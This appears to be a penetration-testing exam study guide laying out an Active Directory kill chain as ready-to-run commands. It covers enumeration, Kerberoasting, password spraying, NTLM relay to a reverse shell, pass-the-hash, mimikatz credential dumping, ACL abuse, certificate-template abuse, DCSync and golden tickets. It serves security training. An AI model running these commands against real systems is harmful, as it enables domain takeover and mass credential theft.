# Active Directory — Enumeration to Domain Admin

**AD is the heart of the CPTS exam.** Expect to chain: get a foothold → find any domain creds → enumerate with BloodHound → roast/relay/coerce → escalate to DA → dump NTDS. This page is the full kill chain. `{target}` = DC IP.

> Set these variables in your head every box: `DC_IP`, `DOMAIN` (e.g. `corp.local`), `USER`, `PASS` / `HASH`. Add the DC to `/etc/hosts` (`{target} dc01.corp.local corp.local`) — Kerberos needs names, not IPs.

---

## Phase 1 — Unauthenticated Enumeration (no creds yet)

```bash
# What is this box? Ports + names
nmap -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 -sV -sC {target}
# 88=Kerberos, 389/636=LDAP/LDAPS, 445=SMB, 3268=Global Catalog, 5985=WinRM -> it's a DC

# Pull the domain/FQDN from LDAP or SMB (no creds needed)
nxc smb {target}            # netexec (formerly crackmapexec) -> shows domain, hostname, OS, signing
ldapsearch -x -H ldap://{target} -s base namingcontexts

# Anonymous / guest SMB
nxc smb {target} -u '' -p ''              # null session
nxc smb {target} -u 'guest' -p ''
smbclient -N -L //{target}/               # list shares as null
enum4linux-ng -A {target}

# RID cycling to harvest usernames without creds
nxc smb {target} -u '' -p '' --rid-brute
impacket-lookupsid {domain}/guest@{target} -no-pass
```

**User enumeration via Kerberos (no password needed — just a userlist):**
```bash
# kerbrute: valid usernames don't error the same way invalid ones do
kerbrute userenum -d {domain} --dc {target} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**AS-REP Roasting (users with "Do not require Kerberos preauth"):**
```bash
# No password required — if it works you get a crackable hash
impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -dc-ip {target} -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## Phase 2 — Authenticated Enumeration (you have ANY domain cred)

```bash
# Validate the cred everywhere (spray one cred across services)
nxc smb {target} -u {user} -p {pass}
nxc ldap {target} -u {user} -p {pass}
nxc winrm {target} -u {user} -p {pass}      # (Pwn3d! = you can Evil-WinRM in)

# Enumerate users, groups, password policy, shares
nxc smb {target} -u {user} -p {pass} --users --groups --pass-pol --shares
nxc smb {target} -u {user} -p {pass} --loggedon-users --sessions
enum4linux-ng -A -u {user} -p {pass} {target}

# LDAP dump of everything
ldapsearch -x -H ldap://{target} -D "{user}@{domain}" -w {pass} -b "DC=corp,DC=local" > ldap_all.txt
# Kerberoastable accounts (users with an SPN)
ldapsearch -x -H ldap://{target} -D "{user}@{domain}" -w {pass} -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

**BloodHound — collect, then find the path.** This is how you win AD boxes.
```bash
# Python collector (run from Kali, no agent on target)
bloodhound-python -u {user} -p {pass} -d {domain} -ns {target} -c All --zip
# or netexec's built-in
nxc ldap {target} -u {user} -p {pass} --bloodhound --collection-method All --dns-server {target}

# Load the zip into BloodHound GUI. Pre-built queries to run:
#  - "Find Shortest Paths to Domain Admins"
#  - "Find Principals with DCSync Rights"
#  - Mark your owned user as Owned, then "Shortest Path from Owned Principals"
#  - Look for: GenericAll, GenericWrite, WriteDacl, AddMember, ForceChangePassword, AllowedToDelegate
```

---

## Phase 3 — Credential Attacks

### Kerberoasting (crack service-account passwords)
```bash
# Request TGS tickets for all SPN accounts, crack offline
impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {target} -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
# Rubeus (from a Windows foothold):  Rubeus.exe kerberoast /outfile:hashes.txt
```

### Password Spraying (one password, many users)
```bash
# LOW AND SLOW — respect lockout policy (check --pass-pol first!)
nxc smb {target} -u users.txt -p 'Winter2024!' --continue-on-success
kerbrute passwordspray -d {domain} --dc {target} users.txt 'Winter2024!'
```

### LLMNR/NBT-NS Poisoning + Relay (get hashes off the wire)
```bash
# Capture NetNTLMv2 hashes from broadcast name resolution
sudo responder -I tun0 -dwv
# crack:  hashcat -m 5600 responder.hash rockyou.txt

# Better: RELAY the hash to a host without SMB signing (find targets first)
nxc smb <subnet>/24 --gen-relay-list targets.txt      # signing:False hosts
# In /etc/responder/Responder.conf set SMB=Off and HTTP=Off, then:
sudo responder -I tun0 -dwv
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'powershell -enc <rev-shell>'
# -socks for an interactive relay session, or --dump-sam / --dump-secrets
```

---

## Phase 4 — Lateral Movement & Execution

Pick the exec method by the port/rights you have. All accept `-hashes LM:NT` for Pass-the-Hash.

```bash
# SMB (445) — classic, drops a service (noisy)
impacket-psexec {domain}/{user}:{pass}@{target}
impacket-psexec {domain}/{user}@{target} -hashes :{nthash}        # Pass-the-Hash

# WMI (135) — cleaner, no service artifact
impacket-wmiexec {domain}/{user}:{pass}@{target}
impacket-wmiexec {domain}/{user}@{target} -hashes :{nthash}

# WinRM (5985) — if "Pwn3d!" in nxc winrm
evil-winrm -i {target} -u {user} -p {pass}
evil-winrm -i {target} -u {user} -H {nthash}                      # Pass-the-Hash

# Scheduled task / DCOM alternatives
impacket-atexec {domain}/{user}:{pass}@{target} whoami
impacket-dcomexec {domain}/{user}:{pass}@{target}

# Run a command across many hosts at once
nxc smb targets.txt -u {user} -p {pass} -x 'whoami' --exec-method smbexec
```

**Pass-the-Ticket / OverPass-the-Hash:**
```bash
# Turn an NT hash into a TGT, then use it
impacket-getTGT {domain}/{user} -hashes :{nthash}
export KRB5CCNAME=$(pwd)/{user}.ccache
impacket-psexec -k -no-pass {domain}/{user}@dc01.{domain}      # note: use the FQDN with -k
nxc smb {target} --use-kcache
```

---

## Phase 5 — Privilege Escalation Inside the Domain

### Dumping credentials from a compromised host
```bash
# Local SAM + LSA + cached creds (needs local admin)
impacket-secretsdump {domain}/{user}:{pass}@{target}
nxc smb {target} -u {user} -p {pass} --sam --lsa

# From a Windows shell — mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # sekurlsa::ekeys        # AES keys for PtT
```

### Abusing BloodHound ACL edges
```bash
# ForceChangePassword: reset a target user's password
net rpc password "targetuser" "NewPass123!" -U "{domain}/{user}%{pass}" -S {target}
# or: bloodyAD
bloodyAD -u {user} -p {pass} -d {domain} --host {target} set password targetuser 'NewPass123!'

# GenericWrite on a user -> set an SPN and Kerberoast them (targeted roast)
targetedKerberoast.py -d {domain} -u {user} -p {pass}

# GenericAll on a user -> targeted AS-REP (disable preauth) or set SPN
bloodyAD -u {user} -p {pass} -d {domain} --host {target} add uac targetuser -f DONT_REQ_PREAUTH

# AddMember -> add yourself to a privileged group
bloodyAD -u {user} -p {pass} -d {domain} --host {target} add groupMember "Domain Admins" {user}

# GenericAll on a computer -> Resource-Based Constrained Delegation takeover
impacket-addcomputer {domain}/{user}:{pass} -computer-name 'EVIL$' -computer-pass 'Pass123!'
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'DC01$' -action write {domain}/{user}:{pass}
impacket-getST -spn cifs/dc01.{domain} -impersonate Administrator {domain}/EVIL\$:'Pass123!'
```

### AD CS (Certificate Services) — ESC1 & friends
```bash
# Find vulnerable certificate templates
certipy-ad find -u {user}@{domain} -p {pass} -dc-ip {target} -vulnerable -stdout
# ESC1: request a cert as any user (Domain Admin) from a vulnerable template
certipy-ad req -u {user}@{domain} -p {pass} -ca 'CORP-CA' -target ca.{domain} -template 'VulnTemplate' -upn administrator@{domain}
# Auth with the cert -> get the TGT + NT hash
certipy-ad auth -pfx administrator.pfx -dc-ip {target}
```

---

## Phase 6 — Domain Domination

```bash
# DCSync — pull any user's hash straight from the DC (needs Replication rights / DA)
impacket-secretsdump {domain}/{user}:{pass}@{target} -just-dc
impacket-secretsdump {domain}/{user}@{target} -hashes :{nthash} -just-dc-user krbtgt
# mimikatz:  lsadump::dcsync /domain:corp.local /user:krbtgt

# Full offline dump: NTDS.dit + SYSTEM (all domain hashes)
impacket-secretsdump {domain}/{user}:{pass}@{target} -just-dc-ntlm

# Golden Ticket (persistence) — needs krbtgt hash + domain SID
impacket-ticketer -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass {domain}/Administrator@dc01.{domain}
```

---

## Trust / Multi-Domain (forest boxes)

```bash
# Enumerate trusts
nxc ldap {target} -u {user} -p {pass} -M enum_trusts
impacket-getST -spn cifs/dc.child.corp.local -impersonate Administrator \
  -extra-sid <enterprise_admins_sid> child.corp.local/user:pass    # SID history / child->parent
```

---

## Tips & Common Mistakes

- **Add the DC and domain to `/etc/hosts`.** Kerberos (`-k`) fails on IPs — use FQDNs. Clock skew > 5 min also breaks Kerberos → `sudo ntpdate {target}` or `faketime`.
- **Spray ONE password across ALL users**, never many passwords at one user — you will lock accounts and fail the exam checkpoint. Always read `--pass-pol` first.
- **Always run BloodHound early.** Manual LDAP is a backup; the graph shows the intended path.
- **Reuse creds everywhere.** A cracked service password is often reused for WinRM/RDP or is a local admin elsewhere (`nxc smb <range> -u u -p p` → look for `Pwn3d!`).
- **`netexec` (`nxc`) replaced `crackmapexec`.** Same syntax; both may exist on the exam VM.
- **Track everything** in a creds table: user → password/hash → where it works → what it can reach.
